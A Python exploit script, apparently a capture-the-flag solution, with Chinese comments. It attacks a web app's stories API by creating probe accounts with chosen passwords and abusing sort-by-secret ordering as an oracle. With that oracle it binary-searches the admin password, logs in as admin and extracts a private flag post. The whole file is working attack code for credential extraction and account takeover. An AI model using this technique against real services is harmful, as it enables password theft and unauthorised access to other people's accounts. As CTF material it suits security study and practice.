import sys
import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://76b6165f-83aa-4919-be5f-d38fe9d0f84a.play.gaslightctf.cooking:1337"

s = requests.Session()
s.verify = False

counter = 0


def signup_probe(secret_hex: str) -> str:
    """注册一个密码为 secret_hex 的探针用户, 并发布一条公开动态。"""
    global counter
    counter += 1
    name = f"prob{counter:03d}"

    r = s.post(f"{BASE}/api/signup", json={"name": name, "password": secret_hex})
    if not r.ok:
        raise RuntimeError(f"signup {name} failed: {r.status_code} {r.text}")

    r = s.post(
        f"{BASE}/api/stories",
        json={"story": "x", "visibility": "public", "minutes": 60},
    )
    if not r.ok:
        raise RuntimeError(f"post story failed: {r.status_code} {r.text}")

    return name


def probe_before_admin(name: str) -> bool:
    """按 secret 升序拉取公开动态, 判断探针是否排在 admin 前面。"""
    r = s.get(f"{BASE}/api/stories", params={"column": "secret", "order": "ASC"})
    r.raise_for_status()
    authors = [x["author"] for x in r.json() if x["visibility"] == "public"]
    return authors.index(name) < authors.index("admin")


def binary_search_admin_secret() -> str:
    """二分搜索 admin 的 secret (16 位小写 hex, 等长字典序 == 数值序)。"""
    lo, hi = 0, 1 << 64
    iters = 0
    while hi - lo > 1:
        mid = (lo + hi) // 2
        guess = format(mid, "016x")
        name = signup_probe(guess)
        if probe_before_admin(name):
            lo = mid + 1  # 探针排在 admin 前 -> admin secret > mid
        else:
            hi = mid      # 探针排在 admin 后/并列 -> admin secret <= mid
        iters += 1
        if iters % 10 == 0:
            print(f"[*] {iters:2d} 轮: [{format(lo, '016x')}, {format(hi, '016x')})")
    print(f"[+] 共 {iters} 轮, 候选密码: {format(lo, '016x')}")
    return format(lo, "016x")


def sanity_check() -> None:
    """用最小/最大 hex 密码验证排序 oracle 是否工作。"""
    n1 = signup_probe("0" * 16)
    n2 = signup_probe("f" * 16)
    ok = probe_before_admin(n1) and not probe_before_admin(n2)
    if not ok:
        raise RuntimeError("排序 oracle 不成立, 目标可能已修复或实例已更换")
    print("[+] 排序 oracle 验证通过: 00..00 < admin.secret < ff..ff")


def login_get_flag(candidate: str) -> str:
    """用候选密码登录 admin 并提取 flag (允许 ±1 的边界误差)。"""
    admin = requests.Session()
    admin.verify = False

    v = int(candidate, 16)
    for delta in (0, -1, 1):
        cand = format(v + delta, "016x")
        r = admin.post(f"{BASE}/api/login", json={"name": "admin", "password": cand})
        print(f"[*] 尝试 admin:{cand} -> {r.status_code}")
        if not r.ok:
            continue
        rows = admin.get(f"{BASE}/api/stories").json()
        for row in rows:
            if row["author"] == "admin" and row["visibility"] == "close_friends":
                return row["story"]
        raise RuntimeError("登录成功但未找到 admin 的 close_friends 动态 (可能已过期)")

    raise RuntimeError("候选密码登录失败, 请重新运行脚本 (实例重启会重置 secret)")


def main() -> None:
    base = sys.argv[1] if len(sys.argv) > 1 else BASE
    globals()["BASE"] = base.rstrip("/")

    print(f"[*] 目标: {BASE}")
    sanity_check()
    candidate = binary_search_admin_secret()
    flag = login_get_flag(candidate)
    print(f"\n[🚩] FLAG: {flag}")


if __name__ == "__main__":
    main()
